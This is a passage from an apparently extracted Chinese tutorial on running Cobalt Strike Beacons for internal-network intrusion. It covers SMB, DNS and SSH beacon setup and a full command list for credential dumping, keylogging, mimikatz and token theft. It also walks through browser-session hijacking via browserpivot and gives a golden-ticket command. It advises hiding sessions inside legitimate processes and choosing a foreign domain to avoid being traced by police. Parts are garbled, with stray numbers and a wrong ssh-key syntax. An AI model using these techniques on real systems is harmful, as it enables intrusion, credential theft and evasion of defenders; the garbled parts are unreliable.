\u7f51\u7edc\u4ee5\u53ca\u6a21\u62df\u4e00\u4e2a\u89c4\u8303\u7684\u6f14\u793a\u662f\u6709\u7528\u7684\uff0c\u8be5\u6f14\u793a\u5c06\u4ed6\u4eec\u5728\u7f51\u7edc\u5185\u90e8\u7684\u901a\u4fe1\u8def\u5f84\u9650\u5236\u4e3a\u5408 \u7406\u7684\u3002\u8fd9\u79cdBeacons\u94fe\u63a5\u662fCobalt Strike\u4e2d\u6700\u5f3a\u5927\u7684\u529f\u80fd\u4e4b\u4e00\u3002\u6211\u4eec\u4e5f\u53ef\u4ee5\u901a\u8fc7\u6570\u636e\u62d3\u6251 \u56fe\u7684\u65b9\u5f0f\u5728\u5c55\u793a\u6211\u4eec\u6bcf\u53f0\u4e0a\u7ebf\u4e3b\u673a\u4e4b\u95f4\u7684\u5173\u7cfb\u548c\u8054\u7cfb\u3002 \u5e38\u7528beacon\u96a7\u9053 \u00b6 1.SMB Beacon \u00b6 \u5b98\u7f51\u4ecb\u7ecd\uff1aSMB Beacon\u4f7f\u7528\u547d\u540d\u7ba1\u9053\u901a\u8fc7\u7236\u7ea7Beacon\u8fdb\u884c\u901a\u8baf\uff0c\u5f53\u4e24\u4e2aBeacons\u8fde\u63a5\u540e\uff0c\u5b50 Beacon\u4ece\u7236Beacon\u83b7\u53d6\u5230\u4efb\u52a1\u5e76\u53d1\u9001\u3002 \u56e0\u4e3a\u8fde\u63a5\u7684Beacons\u4f7f\u7528Windows\u547d\u540d\u7ba1\u9053\u8fdb\u884c\u901a\u4fe1\uff0c\u6b64\u6d41\u91cf\u5c01\u88c5\u5728SMB\u534f\u8bae\u4e2d\uff0c\u6240\u4ee5SMB Beacon\u76f8\u5bf9\u9690\u853d\uff0c\u7ed5\u9632\u706b\u5899\u65f6\u53ef\u80fd\u53d1\u6325\u5947\u6548\u3002 \u8fd9\u5f20\u56fe\u5f88\u597d\u7684\u8be0\u91ca\u4e86SMB beacon\u7684\u5de5\u4f5c\u6d41\u7a0b\uff1a 2\u3001SMB Beacon\u4f7f\u7528 \u00b6 \u8fd9\u79cdBeacon\u8981\u6c42\u5177\u6709SMB Beacon\u7684\u4e3b\u673a\u5fc5\u987b\u63a5\u53d7\u7aef\u53e3445\u4e0a\u7684\u8fde\u63a5\u3002 \u5728Listner\u751f\u6210SMB Beacon>\u76ee\u6807\u4e3b\u673a>\u53f3\u952e> spawn as>\u9009\u4e2d\u5bf9\u5e94\u7684Listener> \u4f7f\u7528\u4e00\u4e2a\u5185\u7f51\u76d1\u542c\u5668 \u5728\u8fd9\u91cc\u4e3a\u4e86\u65b9\u4fbf\uff0c\u6211\u76f4\u63a5\u4e0a\u4f20\u9a6c\u5230\u5185\u7f51\u76ee\u6807\u673a\u5668\u4e2d \u751f\u6210\u9a6c\u540e\u4e0a\u4f20\u7684\u76ee\u6807\u4e2d\u53bb\uff08\u8fd9\u91cc\u4e3a\u65b9\u4fbf\u6f14\u793a\uff0c\u8fd9\u5b9e\u6218\u4e2d\u5177\u4f53\u5982\u4f55\u770b\u5b9e\u9645\uff09 \u8fd0\u884c\u6210\u529f\u540e\u5916\u90e8\u53ef\u4ee5\u770b\u5230\u221e\u221e\u8fd9\u4e2a\u5b57\u7b26\uff0c\u8fd9\u5c31\u662f\u6d3e\u751f\u7684SMB Beacon\u3002 \u5f53\u524d\u662f\u8fde\u63a5\u72b6\u6001\uff0c\u4f60\u53ef\u4ee5Beacon\u4e0a\u7528link \u547d\u4ee4\u94fe\u63a5\u5b83\u6216\u8005unlink \u547d\u4ee4\u65ad\u5f00\u5b83\u3002 \u8fd9\u79cdBeacon\u5728\u5185\u7f51\u6a2a\u5411\u6e17\u900f\u4e2d\u8fd0\u7528\u7684\u5f88\u591a 3\u3001DNS Beacon \u00b6 DNS Beacon\u5728\u7ed5\u8fc7\u9632\u706b\u5899 \u6743\u9650\u7ef4\u6301\u4e0a\u975e\u5e38\u6709\u6548\uff0cDNS beacon\u53ef\u8c13\u662f\u6700\u53d7\u6b22\u8fce\u7684Cobalt Strike\u529f\u80fd \u4e4b\u4e00\u3002 \u5b98\u7f51\u7ed9\u51fa\u7684\u539f\u7406\u793a\u610f\u56fe\u5982\u4e0b\uff1a \u4f7f\u7528DNS Beacon\u9996\u5148\u8981\u6709\u4e00\u4e2a\u57df\u540d\uff0c\u57df\u540d\u5efa\u8bae\u7528\u56fd\u5916\u7684\uff0c\u7701\u53bb\u4e00\u4e9b\u4e0d\u5fc5\u8981\u7684\u9ebb\u70e6\uff0c\u4e5f\u9632\u6b62\u88ab\u67e5\u6c34 \u8868\u3002\u57df\u540d\u4f7f\u7528\u4e00\u4e9b\u901a\u7528\u5e73\u5e38\u7684\u5373\u53ef\uff0c\u6574\u4e2a\u914d\u7f6e\u8fc7\u7a0b\u975e\u5e38\u7b80\u5355\uff0c\u4e00\u6761A\u8bb0\u5f55\u548c\u51e0\u6761NS\u8bb0\u5f55\u5373\u53ef\u3002 \u9996\u5148\u8fdb\u5165\u5230\u57df\u540d\u7ba1\u7406\u754c\u9762\uff08\u81ea\u5df1\u7684\u57df\u540d\u8fc7\u671f\u4e86\uff0c\u7528\u4e00\u4e0b404\u5e08\u5085\u7684\u56fe\uff09 \u914d\u7f6eA\u8bb0\u5f55\u6307\u5411\u670d\u52a1\u5668ip \u2192ns\u8bb0\u5f55\u90fd\u6307\u5411A\u8bb0\u5f55\u57df\u540d \u914d\u7f6e\u597d\u4e86\u6211\u4eec\u53ef\u4ee5\u7528nslookup\u6216\u8005dig +trace\u6765\u6d4b\u8bd5\u4e0b\u662f\u5426\u6210\u529f\uff1a \u5982\u679c\u8fd4\u56de\u7684IP\u5730\u5740\u4e0e\u4f60\u7684\u670d\u52a1\u5668IP\u5730\u5740\u5bf9\u5e94\u662f\u6b63\u786e\u7684\uff0c\u90a3\u6211\u4eec\u5c31\u53ef\u4ee5\u5f00\u59cb\u914d\u7f6edns beacon\u7684\u76d1\u542c\u5668 \u4e86\u3002 Host\u90a3\u91cc\u6700\u597d\u586b\u57df\u540d\uff08A\u8bb0\u5f55\u89e3\u6790\u90a3\u4e2a\uff09\uff0c\u4e0d\u8981\u586b\u670d\u52a1\u5668\u7684IP\u5730\u5740\u3002 \u7136\u540e\u786e\u5b9a\u586b\u4e0ans\u8bb0\u5f55\uff0c\u82f1\u6587\u9017\u53f7\u9694\u5f00\uff0c\u7136\u540e\u751f\u6210\u540e\u95e8\u6d4b\u8bd5\u6548\u679c\u3002 \u8fd9\u662f\u4e3b\u673a\u680f\u4e0a\u51fa\u73b0\u4e86\u4e00\u4e2a\u9ed1\u5c4f\u7684logo\uff0c\u7ecf\u8fc7\u4e00\u6bb5\u65f6\u95f4\u7684\u7b49\u5f85\uff0c\u76ee\u6807\u4e3b\u673a\u5373\u53ef\u4e0a\u7ebf\u3002 4\u3001SSH beacon \u00b6 \u5f53\u5185\u7f51\u6709Linux\u65f6Cobalt Strike\u4e5f\u662f\u8003\u8651\u5230\u7684\u63d0\u4f9b\u4e86SSH\u8fde\u63a5\uff0c\u5927\u5bb6\u53ef\u4ee5\u901a\u8fc7metasploit\u7206\u7834\u5185\u7f51\u7684 SSH\u8d26\u53f7\u5bc6\u7801\uff0c\u7136\u540e\u7528\u76ee\u6807\u673a\u7684Beacon\u53bb\u8fde\u63a5\u5c31\u53ef\u4ee5\u4e86\u3002 \u76ee\u524d\u6709\u4e24\u79cdSSH Beacon\u8fde\u63a5\u65b9\u6cd5\uff1a \u2460\u5bc6\u7801\u76f4\u63a5\u8fde\u63a5 Beacon\u547d\u4ee4: ssh [target:port] [user] [pass] \u2461SSH\u5bc6\u5319\u8fde\u63a5 Beacon\u547d\u4ee4: ssh [target:port] [user] [pass] \u8fde\u63a5\u6210\u529f\u540e\uff0c\u5982\u56fe\u5c31\u4f1a\u51fa\u73b0\u4e00\u4e2a\u5b50Beacon\uff1a Beacons\u7684\u4f7f\u7528 \u00b6 \u53f3\u952e\u76ee\u6807\u4e3b\u673a\uff0c\u70b9\u51fbInteract\u5373\u4f1a\u8fdb\u5165\u6211\u4eec\u7684beacon\u3002\u5982\u56fe\uff1a \u8fdb\u5165beacon\u6a21\u5f0f\u4e4b\u540e\uff0c\u6211\u4eec\u9996\u5148\u8981\u4fee\u6539CS\u9ed8\u8ba4\u7684**\u5fc3\u8df3\u65f6\u95f4**\uff08sleep\uff09\u3002\u4e00\u822c\u60c5\u51b5\u4e0bCS\u9ed8 \u8ba4\u7684\u5fc3\u8df3\u65f6\u95f4\u4e3a60s\uff0c\u5373\u6bcf\u4e00\u5206\u949f\u76ee\u6807\u4e3b\u673a\u4e0e\u6211\u4eec\u7684Teamserver\u670d\u52a1\u5668\u8fdb\u884c\u4ea4\u4e92\u3002\u90a3\u8fd9 \u6837\u7684\u8bdd\u5c31\u4f1a\u8ba9\u6211\u4eec\u6267\u884c\u64cd\u4f5c\u7684\u54cd\u5e94\u901f\u5ea6\u4f1a\u53d8\u6162\u3002\u5982\u679c\u5b9e\u6218\u4e2d\u5c31\u5efa\u8bae\u4e0d\u8981\u592a\u5feb\uff0c\u4e0d\u7136\u6d41\u91cf \u4f1a\u88ab\u5f88\u5feb\u53d1\u73b0\u3002\u5982\u679c\u662f\u5b9e\u9a8c\uff0c\u90a3\u6211\u4eec\u4e00\u822c\u90fd\u662f\u8bbe\u7f6e\u4e3a0\u6216\u80051\u3002 \u5982\u56fe\uff1a \u5728Beacon\u4e2d\u8bbe\u7f6e\u4e5f\u884c \u5982\u679c\u6211\u4eec\u8981\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\uff0c\u5c31\u8981\u4f7f\u7528shell+\u7cfb\u7edf\u547d\u4ee4\u3002\u800c\u4e0d\u80fd\u76f4\u63a5\u4f7f\u7528cmd\u547d\u4ee4\u7b49\u3002\u5982 \u56fe\uff1a \u8bf7\u6ce8\u610f\uff0c\u4fe1\u6807\u662f\u5f02\u6b65\u6709\u6548\u8d1f\u8f7d\u3002\u547d\u4ee4\u4e0d\u4f1a\u7acb\u5373\u6267\u884c\u3002\u6bcf\u4e2a\u547d\u4ee4\u8fdb\u5165\u961f\u5217\u3002\u5f53Beacon\u7b7e\u5165\uff08\u8fde\u63a5\u5230 \u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u4fe1\u6807\u6bcf60\u79d2\u68c0\u67e5\u4e00\u6b21\u3002\u60a8\u53ef\u4ee5\u4f7f\u7528Beacons sleep\u547d\u4ee4\u66f4\u6539\u6b64\u8bbe\u7f6e\u3002\u4f7f\u7528sleep\u52a0 \u8981\u6bcf\u79d2\u8fdb\u884c\u4e00\u6b21\u4fe1\u6807\u68c0\u67e5\u591a\u6b21\uff0c\u8bf7\u5c1d\u8bd5sleep 0\u3002\u8fd9\u662f\u4ea4\u4e92\u6a21\u5f0f\u3002\u5728\u8fd9\u79cd\u6a21\u5f0f\u4e0b\uff0c\u547d\u4ee4\u5c06\u7acb\u5373\u6267\u884c \u4e5f\u53ef\u4ee5\u76f4\u63a5\u6267\u884cCS\u4e2d\u81ea\u5e26\u7684beacon\u547d\u4ee4 \u4f8b\u5982 Beacon Commands \u00b6 1 2 3 Command Description ------- ----------- argue Spoof arguments for matching processes blockdlls Block non-Microsoft DLLs in child processes browserpivot Setup a browser pivot session bypassuac Spawn a session in a high integrity process cancel Cancel a download that's in\ufffeprogress cd Change directory checkin Call home and post data clear Clear beacon queue connect Connect to a Beacon peer over TCP covertvpn Deploy Covert VPN client cp Copy a file dcsync Extract a password hash from a DC desktop View and interact with target's desktop dllinject Inject a Reflective DLL into a process dllload Load DLL into a process with LoadLibrary() download Download a file downloads Lists file downloads in progress drives List drives on target elevate Try to elevate privileges execute Execute a program on target (no output) execute-assembly Execute a local .NET program in-memory on target exit Terminate the beacon session getprivs Enable system privileges on current token getsystem Attempt to get SYSTEM getuid Get User ID hashdump Dump password hashes help Help menu inject Spawn a session in a specific process jobkill Kill a long-running post\ufffeexploitation task jobs List long-running post\ufffeexploitation tasks kerberos_ccache_use Apply kerberos ticket from cache to this session kerberos_ticket_purge Purge kerberos tickets from this session kerberos_ticket_use Apply kerberos ticket to this session keylogger Inject a keystroke logger into a process kill Kill a process link Connect to a Beacon peer over a named pipe logonpasswords Dump credentials and hashes with mimikatz ls List files make_token Create a token to pass credentials mimikatz Runs a mimikatz command mkdir Make a directory mode dns Use DNS A as data channel (DNS beacon only) mode dns-txt Use DNS TXT as data channel (DNS beacon only) mode dns6 Use DNS AAAA as data channel (DNS beacon only) mode http Use HTTP as data channel mv Move a file net Network and host enumeration tool note Assign a note to this Beacon 1 2 portscan Scan a network for open services powerpick Execute a command via Unmanaged PowerShell powershell Execute a command via powershell.exe powershell-import Import a powershell script ppid Set parent PID for spawned post-ex jobs ps Show process list psexec Use a service to spawn a session on a host psexec_psh Use PowerShell to spawn a session on a host psinject Execute PowerShell command in specific process pth Pass-the-hash using Mimikatz pwd Print current directory reg Query the registry rev2self Revert to original token rm Remove a file or folder rportfwd Setup a reverse port forward run Execute a program on target (returns output) runas Execute a program as another user runasadmin Execute a program in a high-integrity context runu Execute a program under another PID screenshot Take a screenshot setenv Set an environment variable shell Execute a command via cmd.exe shinject Inject shellcode into a process shspawn Spawn process and inject shellcode into it sleep Set beacon sleep time socks Start SOCKS4a server to relay traffic socks stop Stop SOCKS4a server spawn Spawn a session spawnas Spawn a session as another user spawnto Set executable to spawn processes into spawnu Spawn a session under another PID ssh Use SSH to spawn an SSH session on a host ssh-key Use SSH to spawn an SSH session on a host steal_token Steal access token from a process timestomp Apply timestamps from one file to another unlink Disconnect from parent Beacon upload Upload a file wdigest Dump plaintext credentials with mimikatz winrm Use WinRM to spawn a session on a host wmi Use WMI to spawn a session on a host Command Description ------- ----------- browserpivot \u6ce8\u5165\u53d7\u5bb3\u8005\u6d4f\u89c8\u5668\u8fdb\u7a0b bypassuac \u7ed5\u8fc7UAC cancel \u53d6\u6d88\u6b63\u5728\u8fdb\u884c\u7684\u4e0b\u8f7d cd \u5207\u6362\u76ee\u5f55 checkin \u5f3a\u5236\u8ba9\u88ab\u63a7\u7aef\u56de\u8fde\u4e00\u6b21 clear \u6e05\u9664beacon\u5185\u90e8\u7684\u4efb\u52a1\u961f\u5217 connect Connect to a Beacon peer over TCP covertvpn \u90e8\u7f72Covert VPN\u5ba2\u6237\u7aef cp \u590d\u5236\u6587\u4ef6 dcsync \u4eceDC\u4e2d\u63d0\u53d6\u5bc6\u7801\u54c8\u5e0c desktop \u8fdc\u7a0bVNC dllinject \u53cd\u5c04DLL\u6ce8\u5165\u8fdb\u7a0b dllload \u4f7f\u7528LoadLibrary\u5c06DLL\u52a0\u8f7d\u5230\u8fdb\u7a0b\u4e2d download \u4e0b\u8f7d\u6587\u4ef6 downloads \u5217\u51fa\u6b63\u5728\u8fdb\u884c\u7684\u6587\u4ef6\u4e0b\u8f7d drives \u5217\u51fa\u76ee\u6807\u76d8\u7b26 elevate \u5c1d\u8bd5\u63d0\u6743 execute \u5728\u76ee\u6807\u4e0a\u6267\u884c\u7a0b\u5e8f(\u65e0\u8f93\u51fa) execute-assembly \u5728\u76ee\u6807\u4e0a\u5185\u5b58\u4e2d\u6267\u884c\u672c\u5730.NET\u7a0b\u5e8f exit \u9000\u51fabeacon getprivs Enable system privileges on current token getsystem \u5c1d\u8bd5\u83b7\u53d6SYSTEM\u6743\u9650 getuid \u83b7\u53d6\u7528\u6237ID hashdump \u8f6c\u50a8\u5bc6\u7801\u54c8\u5e0c\u503c help \u5e2e\u52a9 inject \u5728\u7279\u5b9a\u8fdb\u7a0b\u4e2d\u751f\u6210\u4f1a\u8bdd jobkill \u6740\u6b7b\u4e00\u4e2a\u540e\u53f0\u4efb\u52a1 jobs \u5217\u51fa\u540e\u53f0\u4efb\u52a1 kerberos_ccache_use \u4ececcache\u6587\u4ef6\u4e2d\u5bfc\u5165\u7968\u636e\u5e94\u7528\u4e8e\u6b64\u4f1a\u8bdd kerberos_ticket_purge \u6e05\u9664\u5f53\u524d\u4f1a\u8bdd\u7684\u7968\u636e kerberos_ticket_use \u4eceticket\u6587\u4ef6\u4e2d\u5bfc\u5165\u7968\u636e\u5e94\u7528\u4e8e\u6b64\u4f1a\u8bdd keylogger \u952e\u76d8\u8bb0\u5f55 kill \u7ed3\u675f\u8fdb\u7a0b link Connect to a Beacon peer over a named pipe logonpasswords \u4f7f\u7528mimikatz\u8f6c\u50a8\u51ed\u636e\u548c\u54c8\u5e0c\u503c ls \u5217\u51fa\u6587\u4ef6 make_token \u521b\u5efa\u4ee4\u724c\u4ee5\u4f20\u9012\u51ed\u636e mimikatz \u8fd0\u884cmimikatz mkdir \u521b\u5efa\u4e00\u4e2a\u76ee\u5f55 mode dns \u4f7f\u7528DNS A\u4f5c\u4e3a\u901a\u4fe1\u901a\u9053(\u4ec5\u9650DNS beacon) mode dns-txt \u4f7f\u7528DNS TXT\u4f5c\u4e3a\u901a\u4fe1\u901a\u9053(\u4ec5\u9650D beacon) mode dns6 \u4f7f\u7528DNS AAAA\u4f5c\u4e3a\u901a\u4fe1\u901a\u9053(\u4ec5\u9650DNS beacon) mode http \u4f7f\u7528HTTP\u4f5c\u4e3a\u901a\u4fe1\u901a\u9053 mv \u79fb\u52a8\u6587\u4ef6 net net\u547d\u4ee4 note \u5907\u6ce8 portscan \u8fdb\u884c\u7aef\u53e3\u626b\u63cf powerpick \u901a\u8fc7Unmanaged PowerShell\u6267\u884c\u547d\u4ee4 powershell \u901a\u8fc7powershell.exe\u6267\u884c\u547d\u4ee4 powershell-import \u5bfc\u5165powershell\u811a\u672c ppid Set parent PID for spawned post-ex jobs ps \u663e\u793a\u8fdb\u7a0b\u5217\u8868 p**ec Use a service to spawn a session on a host p**ec_psh Use PowerShell to spawn a session on a host psinject \u5728\u7279\u5b9a\u8fdb\u7a0b\u4e2d\u6267\u884cPowerShell\u547d\u4ee4 pth \u4f7f\u7528Mimikatz\u8fdb\u884c\u4f20\u9012\u54c8\u5e0c pwd \u5f53\u524d\u76ee\u5f55\u4f4d\u7f6e reg Query the registry rev2self \u6062\u590d\u539f\u59cb\u4ee4\u724c rm \u5220\u9664\u6587\u4ef6\u6216\u6587\u4ef6\u5939 rportfwd \u7aef\u53e3\u8f6c\u53d1 run \u5728\u76ee\u6807\u4e0a\u6267\u884c\u7a0b\u5e8f(\u8fd4\u56de\u8f93\u51fa) runas \u4ee5\u53e6\u4e00\u4e2a\u7528\u6237\u6743\u9650\u6267\u884c\u7a0b\u5e8f runasadmin \u5728\u9ad8\u6743\u9650\u4e0b\u6267\u884c\u7a0b\u5e8f runu Execute a program under another PID screenshot \u5c4f\u5e55\u622a\u56fe setenv \u8bbe\u7f6e\u73af\u5883\u53d8\u91cf shell cmd\u6267\u884c\u547d\u4ee4 shinject \u5c06shellcode\u6ce8\u5165\u8fdb\u7a0b shspawn \u751f\u6210\u8fdb\u7a0b\u5e76\u5c06shellcode\u6ce8\u5165\u5176\u4e2d sleep \u8bbe\u7f6e\u7761\u7720\u5ef6\u8fdf\u65f6\u95f4 socks \u542f\u52a8SOCKS4\u4ee3\u7406 socks stop \u505c\u6b62SOCKS4 spawn Spawn a session spawnas Spawn a session as another user spawnto Set executable to spawn processes into spawnu Spawn a session under another PID ssh \u4f7f\u7528ssh\u8fde\u63a5\u8fdc\u7a0b\u4e3b\u673a ssh-key \u4f7f\u7528\u5bc6\u94a5\u8fde\u63a5\u8fdc\u7a0b\u4e3b\u673a steal_token \u4ece\u8fdb\u7a0b\u4e2d\u7a83\u53d6\u4ee4\u724c timestomp \u5c06\u4e00\u4e2a\u6587\u4ef6\u65f6\u95f4\u6233\u5e94\u7528\u5230\u53e6\u4e00\u4e2a\u6587\u4ef6 unlink Disconnect from parent Beacon upload \u4e0a\u4f20\u6587\u4ef6 wdigest \u4f7f\u7528mimikatz\u8f6c\u50a8\u660e\u6587\u51ed\u636e winrm \u4f7f\u7528WinRM\u5728\u4e3b\u673a\u4e0a\u751f\u6210\u4f1a\u8bdd wmi \u4f7f\u7528WMI\u5728\u4e3b\u673a\u4e0a\u751f\u6210\u4f1a\u8bdd argue \u8fdb\u7a0b\u53c2\u6570\u6b3a\u9a97 \u4e00\u4e9b\u4f8b\u5b50 1.Browserpivot \u6ce8\u5165\u53d7\u5bb3\u8005\u6d4f\u89c8\u5668\u8fdb\u7a0b\uff0c\u7136\u540e\u5f00\u542fHTTP\u4ee3\u7406 \u6211\u4eec\u5148\u4f7f\u7528ps / tasklist \u627e\u5230\u6d4f\u89c8\u5668\u7684\u8fdb\u7a0bid\u503c \u6ce8\u5165\u8fdb\u7a0b\uff1a \u6ce8\u5165\u6d4f\u89c8\u5668\u8fdb\u7a0b\u6210\u529f\u4e4b\u540e\uff0c\u4f1a\u663e\u793a\uff1a Browser Pivot HTTP proxy is at: xxx.xxx.xxx.xxx:\u7aef \u53e3\u53f7 1 beacon> browserpivot 1580 \u7136\u540e\u5c31\u53ef\u4ee5\u8bbe\u7f6e\u672c\u5730HTTP\u6d4f\u89c8\u5668\u4ee3\u7406 \u7136\u5f53\u88ab\u653b\u51fb\u8005\u5173\u95ed\u6d4f\u89c8\u5668\u7684\u65f6\u5019\uff0c\u4ee3\u7406\u4e5f\u5c31\u5931\u6548\u4e86\uff0c\u5173\u95ed\u6b64\u4ee3\u7406\u53ef\u4f7f\u7528\u5982\u4e0b\u547d\u4ee4\uff1a browserpivot stop \u6b64\u529f\u80fd\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u53d7\u5230\u5a01\u80c1\u7684\u7528\u6237\u7684\u6d4f\u89c8\u4f1a\u8bdd\u3002 \u8fd9\u79cd\u653b\u51fb\u7684\u5de5\u4f5c\u65b9\u5f0f\uff1a \u53d7\u5bb3\u8005\u4f7f\u7528Internet Explorer\u767b\u5f55\u5230\u67d0\u4e9bWeb\u5e94\u7528\u7a0b\u5e8f\u3002 \u653b\u51fb\u8005/\u64cd\u4f5c\u8005\u901a\u8fc7\u53d1\u51fa\u547d\u4ee4\u6765\u521b\u5efa\u6d4f\u89c8\u5668\u67a2\u8f74browserpivot \u4fe1\u6807\u901a\u8fc7\u7ed1\u5b9a\u548c\u4fa6\u542c\u7aef\u53e3\uff08\u4f8b\u5982\u8bf46605\uff09\uff0c\u5728\u53d7\u5bb3\u7cfb\u7edf\u4e0a\u521b\u5efa\u4ee3\u7406\u670d\u52a1\u5668\uff08\u66f4\u7cbe\u786e \u5730\u8bf4\uff0c\u5728Internet Explorer\u8fdb\u7a0b\u4e2d\uff09\u3002 \u56e2\u961f\u670d\u52a1\u5668\u7ed1\u5b9a\u5e76\u5f00\u59cb\u4fa6\u542c\u7aef\u53e3\uff0c\u4f8b\u598233912 \u653b\u51fb\u8005\u73b0\u5728\u53ef\u4ee5\u4f7f\u7528\u4ed6\u4eec\u7684teamserver\uff1a33912\u4f5c\u4e3aWeb\u4ee3\u7406\u3002\u901a\u8fc7\u6b64\u4ee3\u7406\u7684\u6240\u6709\u6d41 \u91cf\u90fd\u5c06\u901a\u8fc7Internet Explorer\u8fdb\u7a0b\uff08\u7aef\u53e36605\uff09\u8f6c\u53d1/\u904d\u5386\u5728\u53d7\u5bb3\u8005\u7cfb\u7edf\u4e0a\u6253\u5f00\u7684 \u4ee3\u7406\u3002\u7531\u4e8eInternet Explorer\u4f9d\u8d56WinINet\u5e93\u6765\u7ba1\u7406Web\u8bf7\u6c42\u548c\u8eab\u4efd\u9a8c\u8bc1\uff0c\u56e0\u6b64\u5c06\u5bf9 \u653b\u51fb\u8005\u7684Web\u8bf7\u6c42\u8fdb\u884c\u91cd\u65b0\u8eab\u4efd\u9a8c\u8bc1\uff0c\u4ece\u800c\u4f7f\u653b\u51fb\u8005\u53ef\u4ee5\u67e5\u770b\u53d7\u5bb3\u8005\u5177\u6709\u6d3b\u52a8\u4f1a\u8bdd\u7684 \u76f8\u540c\u5e94\u7528\u7a0b\u5e8f\uff0c\u800c\u65e0\u9700\u8981\u6c42\u767b\u5f55\u3002 \u5229\u7528\u624b\u6cd5; 1 browserpivot 244 x86 \u5de6\u4fa7-\u53d7\u5bb3\u7cfb\u7edf\u5df2\u767b\u5f55\u5230\u67d0\u4e2a\u5e94\u7528\u7a0b\u5e8f\uff0c\u53f3\u4fa7-\u653b\u51fb\u8005ID\u8bd5\u56fe\u8bbf\u95ee\u540c\u4e00\u5e94\u7528\u7a0b\u5e8f\uff0c\u5e76\u7531\u4e8e\u672a \u901a\u8fc7\u8eab\u4efd\u9a8c\u8bc1\u800c\u663e\u793a\u767b\u5f55\u5c4f\u5e55\uff1a \u5982\u679c\u653b\u51fb\u8005\u5f00\u59cb\u901a\u8fc7\u53d7\u5bb3\u8005\u4ee3\u7406\u6765\u4ee3\u7406\u5176\u7f51\u7edc\u6d41\u91cf\uff0c\u5219\u60c5\u51b5\u5c06\u53d1\u751f\u53d8\u5316\uff1a10.0.0.5:33912 2.powershell-import \u5bfc\u5165\u5404\u79cdpowershell\u6e17\u900f\u6846\u67b6\uff0c\u76f4\u63a5\u6267\u884c\uff1a \u6216\u8005\u76f4\u63a5\u6267\u884c\uff1a \u8981\u6267\u884c\u67d0\u6a21\u5757\u76f4\u63a5\u4f7f\u7528\u5982\u4e0b\u547d\u4ee4,\u6bd4\u5982 3.kerberos \u5171\u6709\u4e09\u4e2a\u6a21\u5757 \u4e5f\u5c31\u662f\u57df\u4e2d\u5e38\u7528\u7684\u624b\u6bb5 \u666e\u901a\u7968\u636e\u3001\u91d1\u94f6\u7968\u636e\u4f20\u9012\u653b\u51fb \u4f7f\u7528mimikatz: beacon> powershell-import powershell-import [/path/to/local/script.ps1] beacon> powershell xxx-xxx kerberos_ccache_use \u4ececache\u6587\u4ef6\u4e2d\u5bfc\u5165\u7968\u636e kerberos_ticket_purge \u6e05\u9664\u5f53\u524d\u4f1a\u8bdd\u7684\u7968\u636e kerberos_ticket_use \u4eceticket\u6587\u4ef6\u4e2d\u5bfc\u5165\u7968\u636e 1 1 1 1 2 3 4.\u5728\u6ca1\u6709powershell.exe\u7684\u60c5\u51b5\u4e0b\u4f7f\u7528powershell \u4f7f\u7528powerpick\u547d\u4ee4\u53ef\u5728\u6ca1\u6709powershell.exe\u7684\u60c5\u51b5\u4e0b\u6267\u884cPowerShell \u547d\u4ee4 \u8be5\u547d\u4ee4\u5c06\u6ce8\u5165\u975e\u6258\u7ba1\u7684PowerShell\u4e3a\u7279\u5b9a\u7684\u8fc7\u7a0b\uff0c\u5e76\u4ece\u8be5\u4f4d\u7f6e\u8fd0\u884c\u7684cmdlet 5.\u5728\u6ca1\u6709CMD.exe\u7684\u60c5\u51b5\u4e0b\u4f7f\u7528CMD\u547d\u4ee4 \u4f7f\u7528run\u547d\u4ee4\u6267\u884c\u4e0d\u5e26cmd.exe\u7684\u547d\u4ee4\u3002\u8fd0\u884c\u547d\u4ee4\u5c06\u8f93\u51fa\u8f93\u51fa\u7ed9\u60a8\u3002\u5728\u6267\u884c\u547d\u4ee4\u5728\u540e\u53f0\u8fd0 \u884c\u7684\u7a0b\u5e8f\u5e76\u4e0d\u80fd\u6355\u83b7\u8f93\u51fa\u3002 1 kerberos::golden /admin:USER /domain:DOMAIN /sid:SID /krbtgt:HASH /ticket:FIL 6.\u66f4\u6539shell\u7684\u8def\u5f84 \u5982\u679c\u5e0c\u671bBeacon\u4ece\u7279\u5b9a\u76ee\u5f55\u6267\u884c\u547d\u4ee4\uff0c\u53ef\u4ee5\u5728Beacon\u63a7\u5236\u53f0\u4e2d\u4f7f\u7528cd\u547d\u4ee4\u6765\u5207\u6362 Beacon\u8fdb\u7a0b\u7684\u5de5\u4f5c\u76ee\u5f55\u3002\u4f7f\u7528pwd\u547d\u4ee4\u83b7\u53d6shell\u7684\u76ee\u5f55\u3002 \u7136\u540e\u4f7f\u7528cd\u547d\u4ee4\u5c31\u53ef\u4ee5\u5207\u6362\u4e86\uff0cSETENV\u547d\u4ee4\u5c06\u8bbe\u7f6e\u73af\u5883\u53d8\u91cf\u3002 7.\u8fdb\u7a0b\u6ce8\u5165 \u8fdb\u7a0b\u6ce8\u5165\u6211\u4eec\u8fd9\u91cc\u6f14\u793a\u4e8c\u79cd\u65b9\u6cd5 \u5206\u522b\u662f inject\u547d\u4ee4\u548cspawnto\u547d\u4ee4 \u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0ccs\u5728rundll32.exe\u4e2d\u4ea7\u751f\u4e00\u4e2a\u4f1a\u8bdd\u3002\u8fd0\u7ef4\u7ba1\u7406\u5458\u53ef\u80fd\u4f1a\u53d1\u73b0rundll32.exe\u5b9a \u671f\u4e0eInternet\u5efa\u7acb\u8fde\u63a5\u5f88\u5947\u602a\u3002\u4f7f\u7528\u67e5\u627e\u4e00\u4e2a\u66f4\u597d\u7684\u7a0b\u5e8f\uff08\u4f8b\u5982Internet Explorer\uff09\uff0c\u7136\u540e \u6ce8\u5165\u5230\u5b83\u7684\u8fdb\u7a0b\u4e2d\u53bb\uff0c\u53ef\u4ee5\u6709\u6548\u9690\u85cf\u4f1a\u8bdd 1.\u4f7f\u7528spawn\u547d\u4ee4 \u4f7f\u7528ps\u547d\u4ee4\u5217\u51fa\u8fdb\u7a0b \u4f7f\u7528spawnt\u547d\u4ee4\u6ce8\u5165\u5230\u67d0\u4e00\u8fdb\u7a0b\u4e2d \u8bbe\u7f6e\u76d1\u542c\u5668 1 spawn [x86/x68] [\u8fdb\u7a0b\u540d\u5b57/\u8def\u5f84] \u6ce8\u5165\u6210\u529f\u4f1a\u8fd4\u56de\u4e00\u4e2a\u65b0\u7684\u4f1a\u8bdd 